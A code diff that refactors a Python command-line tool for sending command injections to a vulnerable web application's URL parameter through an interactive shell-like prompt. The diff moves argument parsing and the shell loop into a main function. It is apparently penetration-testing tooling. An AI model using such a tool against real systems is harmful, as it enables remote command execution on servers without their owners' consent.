@@ -8,14 +8,15 @@ import requests
 
 
 # Configuration
-address = 'http://localhost:8000/good'
-parameter = 'q'
+address = None
+parameter = None
 url_encode = True
 verbose = False
 cookies = None
 user_agent = None
 prefix = None
 suffix = None
+no_preflight = False
 
 
 def voutput(message):
@@ -77,30 +78,7 @@ def preflight_request():
 
 
 def main():
-    if not skip_preflight:
-        is_successful = preflight_request()
-        if is_successful:
-            print("Connection successful!")
-    else:
-        print("Skipping preflight checks.")
-    
-    host_name = urllib.parse.urlparse(address).netloc
-
-    # Shell-like environment
-    while True:
-        command = input(f"\n{host_name} > ")
-        if command.lower() in ['exit', 'quit']:
-            print("Exiting shell.")
-            break
-        
-        output = send_command(command)
-        if output is not None:
-            print(f"{output}")
-        else:
-            print("[!] Failed to retrieve command output.")
-
-
-if __name__ == "__main__":
+    global address, parameter, url_encode, verbose, cookies, user_agent, prefix, suffix, no_preflight
     parser = argparse.ArgumentParser(description=" A lightweight HTTP CLI Shell that enables custom command injections into vulnerable web applications with a familiar shell-like interface.")
     parser.add_argument("--address", "-a", help="Target address containing the full path. E.g., http://example.com/vulnerable.php")
     parser.add_argument("--parameter", "-p", help="Parameter name where the injection will occur. E.g., 'cmd' for http://example.com/vulnerable.php?cmd=...")
@@ -124,6 +102,30 @@ if __name__ == "__main__":
     user_agent = args.agent
     prefix = args.prefix
     suffix = args.suffix
-    skip_preflight = args.no_preflight
+    no_preflight = args.no_preflight
     
+    if not no_preflight:
+        is_successful = preflight_request()
+        if is_successful:
+            print("Connection successful!")
+    else:
+        print("Skipping preflight checks.")
+    
+    host_name = urllib.parse.urlparse(address).netloc
+
+    # Shell-like environment
+    while True:
+        command = input(f"\n{host_name} > ")
+        if command.lower() in ['exit', 'quit']:
+            print("Exiting shell.")
+            break
+        
+        output = send_command(command)
+        if output is not None:
+            print(f"{output}")
+        else:
+            print("[!] Failed to retrieve command output.")
+
+
+if __name__ == "__main__":
     main()
